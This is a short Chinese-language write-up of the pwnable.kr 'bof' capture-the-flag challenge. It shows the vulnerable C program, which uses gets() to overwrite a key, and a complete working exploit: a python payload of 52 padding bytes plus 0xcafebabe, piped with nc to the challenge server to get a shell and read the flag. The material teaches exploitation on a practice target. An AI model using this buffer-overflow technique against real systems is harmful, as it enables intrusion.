@@ -1,0 +1,33 @@
+题目：http://pwnable.kr/play.php第三题
+
+两个文件，其中一个为如下代码：
+ 1 #include <stdio.h>
+ 2 #include <string.h>
+ 3 #include <stdlib.h>
+ 4 void func(int key){
+ 5     char overflowme[32];
+ 6     printf("overflow me : ");
+ 7     gets(overflowme);    // smash me!
+ 8     if(key == 0xcafebabe){
+ 9         system("/bin/sh");
+10     }
+11     else{
+12         printf("Nah..\n");
+13     }
+14 }
+15 int main(int argc, char* argv[]){
+16     func(0xdeadbeef);
+17     return 0;
+18 }
+另一个为名叫bof的无后缀文件，用记事本打开后发现开头有ELF字样。
+查壳发现无壳，为elf文件
+题目中有提示：
+Nana told me that buffer overflow is one of the most common software vulnerability. Is that true
+由buffer overflow得知为缓冲区溢出问题
+而代码中的0xcafebabe和0xdeadbeef可以得知要利用地址的距离（？）
+将bof用IDA分析，找到两个地址并进行比对获得地址差距
+将不足的位数用'0'补齐构成垃圾数据，再将key的0xcafebabe以小端存储顺序（由gdb分析得来（？）），
+以(python -c "print '0'*52+'\xbe\xba\xfe\xca'"; cat -)|nc pwnable.kr 9000
+	ls -l flag
+	cat flag
+在linux中进行检验，得到最终结果
